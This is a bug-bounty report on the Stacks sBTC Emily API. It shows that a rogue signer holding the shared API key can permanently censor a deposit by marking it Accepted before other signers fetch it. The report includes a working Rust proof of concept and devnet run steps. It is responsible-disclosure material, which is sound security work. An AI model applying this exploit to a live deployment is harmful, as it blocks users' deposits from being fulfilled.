# #38133 \[BC-Medium] A rogue Signer can censor any deposit request from being processed and fullfilled

**Submitted on Dec 25th 2024 at 16:36:22 UTC by @niroh for** [**Attackathon | Stacks**](https://immunefi.com/audit-competition/stacks-attackathon-1)

* **Report ID:** #38133
* **Report Type:** Blockchain/DLT
* **Report severity:** Medium
* **Target:** <https://github.com/stacks-network/sbtc/tree/immunefi\\_attackaton\\_0.9/emily>
* **Impacts:**
  * Network not being able to confirm new transactions (total network shutdown)

## Description

## Brief/Intro

Sbtc deposit handling by the Signer network starts with the user submiting a deposit request to the Emily API. The Emily API stores this deposit request together with a Status enum (Pending, Reprocessing, Accepted, Confirmed, Failed) starting as Pending. With each new bitcoin block all signers retrieve all Pending deposit requests from the Emily API using the get\_deposits() method. As the deposit request progresses through the Signers execution process, the signers report back to the Emily API the request's updated status using the update\_deposits method. update\_deposits requires an ApiKey that only the Signers hold. However, a rogue signer can use this Api key to submit an incorrect status update for a Pending deposit that was not handled yet, thus preventing the deposit from ever getting retrieved by the Signers and from ever getting processed on the stacks blockchain.

## Vulnerability Details

Following is the attack path for the described vulnerability:

1. A rogue signer decides to censor specific deposit requests, preventing them from being processed by the signers network.
2. The Signer monitors the Emily Api for new deposit requests (by calling the Api get\_deposits method directly, outside of the Signer client)
3. When the Signer detects a deposit request they wish to censor, they immediatly send an update\_deposits Api call to emily, setting the deposit request status to Accepted.
4. When the next bitcoin block is observed by all Signers, they will retrieve Pending deposit requests from Emily, but the censored request will not be retrieved because it is allready set to Accepted state.
5. The Censored transaction remains in the Emily DB as Accepted and will never be handled by the Signers because the Emily Api considers it handled.
6. If another signer tries to reset the deposit request back to Pending, the rogue signer can update the status back to Pending, which creates a race condition of whose status update lands last before signers retrieve deposits again (with each new bitcoin block).

## Impact Details

Permanent censoring of any deposit request. The rogue signer can censor any deposit transaction they want with the method described above.

## References

<https://github.com/stacks-network/sbtc/blob/891677e7602f97b2e088e9940b2b4536ae9aad1b/emily/handler/src/api/handlers/deposit.rs#L319>

## Proof of Concept

## Proof of Concept

### How to run

1. Create a backup for demo\_cli.rs and replace its content with the code below.\
   Main changes:\
   a. Adds an update\_deposit\_status function that calls the Emily Api to change the status of a deposit request.\
   b. Changes exec\_deposit to call update\_deposit\_status(Accepted) immediately after the deposit request is sent to Emily (to emulate the rogue signer changing the status immediately after the deposit request arrives).

```rust
use std::str::FromStr;

use bitcoin::hex::DisplayHex;
use bitcoin::{
    absolute, transaction::Version, Amount, Network, OutPoint, ScriptBuf, Sequence, Transaction,
    TxIn, TxOut,
};
use bitcoin::{Address, XOnlyPublicKey};
use bitcoincore_rpc::json;
use bitcoincore_rpc::{Client, RpcApi};
use clap::{Args, Parser, Subcommand};
use clarity::{
    types::{chainstate::StacksAddress, Address as _},
    vm::types::{PrincipalData, StandardPrincipalData},
};
use emily_client::{
    apis::{
        configuration::{ApiKey, Configuration},
        deposit_api,
    },
    models::CreateDepositRequestBody,
    models::UpdateDepositsRequestBody,
    models::DepositUpdate,
    models::Status
};
use url::Url;
use std::time::Duration;
use std::thread;
use fake::Fake as _;
use rand::rngs::OsRng;
use sbtc::deposits::{DepositScriptInputs, ReclaimScriptInputs};
use secp256k1::PublicKey;
use signer::config::Settings;
use signer::keys::SignerScriptPubKey;
use signer::storage::model::StacksPrincipal;
use signer::stacks::api::{StacksClient, StacksInteract};

#[derive(Debug, thiserror::Error)]
#[allow(clippy::enum_variant_names)]
enum Error {
    #[error("Signer error: {0}")]
    SignerError(#[from] signer::error::Error),
    #[error("Bitcoin RPC error: {0}")]
    BitcoinRpcError(#[from] bitcoincore_rpc::Error),
    #[error("Invalid Bitcoin address: {0}")]
    InvalidBitcoinAddress(#[from] bitcoin::address::ParseError),
    #[error("No available UTXOs")]
    NoAvailableUtxos,
    #[error("Secp256k1 error: {0}")]
    Secp256k1Error(#[from] secp256k1::Error),
    #[error("SBTC error: {0}")]
    SbtcError(#[from] sbtc::error::Error),
    #[error("Emily deposit error: {0}")]
    EmilyDeposit(#[from] emily_client::apis::Error<deposit_api::CreateDepositError>),
    #[error("Invalid stacks address: {0}")]
    InvalidStacksAddress(String),
    #[error("Invalid signer key: {0}")]
    InvalidSignerKey(String),
}

#[derive(Debug, Parser)]
struct CliArgs {
    #[clap(subcommand)]
    command: CliCommand,
}

#[derive(Debug, Subcommand)]
enum CliCommand {
    /// Simulate a deposit request
    Deposit(DepositArgs),
    Donation(DonationArgs),
    Info(InfoArgs),
}

#[derive(Debug, Args)]
struct DepositArgs {
    /// Amount to deposit in satoshis, excluding the fee.
    #[clap(long)]
    amount: u64,
    /// Maximum fee to pay for the transaction in satoshis, in addition to
    /// the amount.
    #[clap(long)]
    max_fee: u64,
    /// Lock time for the transaction.
    #[clap(long)]
    lock_time: u32,
    /// The beneficiary Stacks address to receive the deposit in sBTC.
    #[clap(long = "stacks-addr")]
    stacks_recipient: String,
    /// The public key of the aggregate signer.
    #[clap(long = "signer-key")]
    signer_aggregate_key: String,
}

#[derive(Debug, Args)]
struct DonationArgs {
    /// Amount to deposit in satoshis, excluding the fee.
    #[clap(long)]
    amount: u64,
    /// The public key of the aggregate signer.
    #[clap(long = "signer-key")]
    signer_aggregate_key: String,
}

#[derive(Debug, Args)]
struct InfoArgs {
    /// The public key of the aggregate signer.
    #[clap(long = "signer-key")]
    signer_aggregate_key: String,
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let args = CliArgs::parse();

    let settings = Settings::new(Some("signer/src/config/default.toml"))?;

    // Setup our Emily client configuration by getting the first configured endpoint
    // and using that to populate the client.
    let mut emily_api_endpoint = settings
        .emily
        .endpoints
        .first()
        .expect("No Emily endpoints configured")
        .clone();

    let emily_api_key = if emily_api_endpoint.username().is_empty() {
        None
    } else {
        Some(ApiKey {
            prefix: None,
            key: emily_api_endpoint.username().to_string(),
        })
    };

    let _ = emily_api_endpoint.set_username("");

    let emily_client_config = Configuration {
        base_path: emily_api_endpoint
            .to_string()
            .trim_end_matches("/")
            .to_string(),
        api_key: emily_api_key,
        ..Default::default()
    };

    let bitcoin_url = format!(
        "{}wallet/depositor",
        settings
            .bitcoin
            .rpc_endpoints
            .first()
            .expect("No Bitcoin RPC endpoints configured")
    );

    let bitcoin_client = Client::new(
        &bitcoin_url,
        bitcoincore_rpc::Auth::UserPass("devnet".into(), "devnet".into()),
    )
    .expect("Failed to create Bitcoin RPC client");

    match args.command {
        CliCommand::Deposit(args) => {
            exec_deposit(args, &bitcoin_client, &emily_client_config).await?
        }
        CliCommand::Donation(args) => exec_donation(args, &bitcoin_client).await?,
        CliCommand::Info(args) => exec_info(args).await?,
    }

    Ok(())
}

async fn exec_deposit(
    args: DepositArgs,
    bitcoin_client: &Client,
    emily_config: &Configuration,
) -> Result<(), Error> {

    let donargs = DonationArgs{amount:2000000u64,
        signer_aggregate_key:args.signer_aggregate_key.clone()};
    exec_donation(donargs,bitcoin_client).await?;

    let (unsigned_tx, deposit_script, reclaim_script) =
        create_bitcoin_deposit_transaction(bitcoin_client, &args)?;

    let txid = unsigned_tx.compute_txid();

    let signed_tx = bitcoin_client.sign_raw_transaction_with_wallet(&unsigned_tx, None, None)?;
    println!("Signed transaction: {:?}", hex::encode(&signed_tx.hex));
    let tx = bitcoin_client.send_raw_transaction(&signed_tx.hex)?;
    println!("Transaction sent: calculated txid {txid:?}, actual txid {tx:?}");

    let emily_deposit = deposit_api::create_deposit(
        emily_config,
        CreateDepositRequestBody {
            bitcoin_tx_output_index: 0,
            bitcoin_txid: txid.to_string(),
            deposit_script: deposit_script.deposit_script().to_hex_string(),
            reclaim_script: reclaim_script.reclaim_script().to_hex_string(),
        },
    )
    .await?;

    update_deposit_status(txid.to_string(), 0, Status::Accepted, emily_config, "".to_string()).await?;
    println!("Deposit request created: {:?}", emily_deposit);

    Ok(())
}

async fn update_deposit_status(bitcoin_txid: String, bitcoin_tx_output_index: u32, status: Status, emily_config: &Configuration, msg: String)  -> Result<(), Error> {
    let url =  Url::parse( "http://localhost:20443").unwrap();
    let sc = StacksClient::new(url, 31)?;
    let ti = sc.get_tenure_info().await.unwrap();

    let bid = ti.tip_block_id;
    let bh = ti.tip_height;
    
    let du = DepositUpdate {bitcoin_tx_output_index: 0,
        bitcoin_txid: bitcoin_txid,
        last_update_block_hash: bid.to_string(),
        last_update_height: bh,
        status: status,
        fulfillment: None,
        status_message: msg};

    let mut update_request = Vec::<DepositUpdate>::new();
    update_request.push(du);
    
    let update_body = UpdateDepositsRequestBody{ deposits:update_request };
    //attacker sends a fake status update immediately after the deposit request is created
    let emily_deposit_update = deposit_api::update_deposits(emily_config, update_body).await.unwrap();
    Ok(())
}

async fn exec_donation(args: DonationArgs, bitcoin_client: &Client) -> Result<(), Error> {
    let pubkey = XOnlyPublicKey::from_str(&args.signer_aggregate_key)
        .or_else(|_| PublicKey::from_str(&args.signer_aggregate_key).map(XOnlyPublicKey::from))
        .map_err(|_| Error::InvalidSignerKey(args.signer_aggregate_key.clone()))?;

    // Look for UTXOs that can cover the amount + max fee
    let opts = json::ListUnspentQueryOptions {
        minimum_amount: Some(Amount::from_sat(args.amount)),
        ..Default::default()
    };

    let unspent = bitcoin_client
        .list_unspent(Some(6), None, None, None, Some(opts))?
        .into_iter()
        .next()
        .ok_or(Error::NoAvailableUtxos)?;

    // Get a new address for change (SegWit)
    let change_address = bitcoin_client
        .get_new_address(None, Some(json::AddressType::Bech32))?
        .require_network(Network::Regtest)?;

    // Create the unsigned transaction
    let unsigned_tx = Transaction {
        input: vec![TxIn {
            previous_output: OutPoint {
                txid: unspent.txid,
                vout: unspent.vout,
            },
            script_sig: Default::default(),
            sequence: Sequence::ZERO,
            witness: Default::default(),
        }],
        output: vec![
            TxOut {
                value: Amount::from_sat(args.amount),
                script_pubkey: pubkey.signers_script_pubkey(),
            },
            TxOut {
                value: Amount::from_sat(unspent.amount.to_sat() - args.amount - 153),
                script_pubkey: change_address.into(),
            },
        ],
        version: Version::TWO,
        lock_time: absolute::LockTime::ZERO,
    };

    let signed_tx = bitcoin_client.sign_raw_transaction_with_wallet(&unsigned_tx, None, None)?;
    println!("Signed transaction: {:?}", hex::encode(&signed_tx.hex));
    let tx = bitcoin_client.send_raw_transaction(&signed_tx.hex)?;

    println!("Transaction sent: {tx:?}");

    Ok(())
}

async fn exec_info(args: InfoArgs) -> Result<(), Error> {
    let pubkey = XOnlyPublicKey::from_str(&args.signer_aggregate_key)
        .or_else(|_| PublicKey::from_str(&args.signer_aggregate_key).map(XOnlyPublicKey::from))
        .map_err(|_| Error::InvalidSignerKey(args.signer_aggregate_key.clone()))?;
    println!("Signers pubkey (for bridge): {pubkey}");

    let address =
        Address::from_script(&pubkey.signers_script_pubkey(), bitcoin::Network::Regtest).unwrap();
    println!("Signers bitcoin address (for donation): {address}");

    let random_principal: StacksPrincipal = fake::Faker.fake_with_rng(&mut OsRng);
    println!(
        "Random stacks address (for demo recipient): {}",
        *random_principal
    );

    Ok(())
}

fn create_bitcoin_deposit_transaction(
    client: &Client,
    args: &DepositArgs,
) -> Result<(Transaction, DepositScriptInputs, ReclaimScriptInputs), Error> {
    let pubkey = XOnlyPublicKey::from_str(&args.signer_aggregate_key)
        .or_else(|_| PublicKey::from_str(&args.signer_aggregate_key).map(XOnlyPublicKey::from))
        .map_err(|_| Error::InvalidSignerKey(args.signer_aggregate_key.clone()))?;

    let deposit_script = DepositScriptInputs {
        signers_public_key: pubkey,
        max_fee: args.max_fee,
        recipient: PrincipalData::Standard(StandardPrincipalData::from(
            StacksAddress::from_string(&args.stacks_recipient)
                .ok_or(Error::InvalidStacksAddress(args.stacks_recipient.clone()))?,
        )),
    };

    let reclaim_script = ReclaimScriptInputs::try_new(args.lock_time, ScriptBuf::new())?;

    // Look for UTXOs that can cover the amount + max fee
    let opts = json::ListUnspentQueryOptions {
        minimum_amount: Some(Amount::from_sat(args.amount + args.max_fee)),
        ..Default::default()
    };
    let unspent = client
        .list_unspent(Some(6), None, None, None, Some(opts))?
        .into_iter()
        .next()
        .ok_or(Error::NoAvailableUtxos)?;

    // Get a new address for change (SegWit)
    let change_address = client
        .get_new_address(None, Some(json::AddressType::Bech32))?
        .require_network(Network::Regtest)?;

    // Create the unsigned transaction
    let unsigned_tx = Transaction {
        input: vec![TxIn {
            previous_output: OutPoint {
                txid: unspent.txid,
                vout: unspent.vout,
            },
            script_sig: Default::default(),
            sequence: Sequence::ZERO,
            witness: Default::default(),
        }],
        output: vec![
            TxOut {
                value: Amount::from_sat(args.amount + args.max_fee),
                script_pubkey: sbtc::deposits::to_script_pubkey(
                    deposit_script.deposit_script(),
                    reclaim_script.reclaim_script(),
                ),
            },
            TxOut {
                value: Amount::from_sat(unspent.amount.to_sat() - args.amount - args.max_fee - 153),
                script_pubkey: change_address.into(),
            },
        ],
        version: Version::TWO,
        lock_time: absolute::LockTime::ZERO,
    };

    println!(
        "deposit script: {:?}",
        deposit_script
            .deposit_script()
            .as_bytes()
            .to_lower_hex_string()
    );
    println!(
        "reclaim script: {:?}",
        reclaim_script
            .reclaim_script()
            .as_bytes()
            .to_lower_hex_string()
    );

    Ok((unsigned_tx, deposit_script, reclaim_script))
}
```

2. Run the devnet docker with make devenv-up
3. Once the system is up, run ./signers.sh info to get the SIGNERS\_KEY
4. Run `cargo run -p signer --bin demo-cli deposit --amount 42 --max-fee 20000 --lock-time 50 --stacks-addr ST2SBXRBJJTH7GV5J93HJ62W2NRRQ46XYBK92Y039 --signer-key SIGNERS_KEY` (Creates a bitcoin tx and a deposit request on the Emily Api and immediately sets the deposit request status on Emily to Accepted, even though is was not seen yet by the signers)
5. Run `aws dynamodb scan \ --table-name DepositTable-xxxxxxxxxxxx-us-east-1-local \ --endpoint-url http://localhost:8000 > some_file_path`
6. to see that the deposit request is in the emily db with status Accepted
7. run `psql postgresql://postgres:postgres@localhost:5432/signer -c "SELECT * FROM sbtc_signer.deposit_signers AS dr" > output_file`.
8. See that there are no actual decisions on the deposit by any signer
9. Check the Stacks explorer (<http://localhost:3020/address/SN3R84XZYA63QS28932XQF3G1J8R9PC3W76P9CSQS?chain=testnet\\&api=http://localhost:3999>) to see that no Deposit Completed transaction exists.
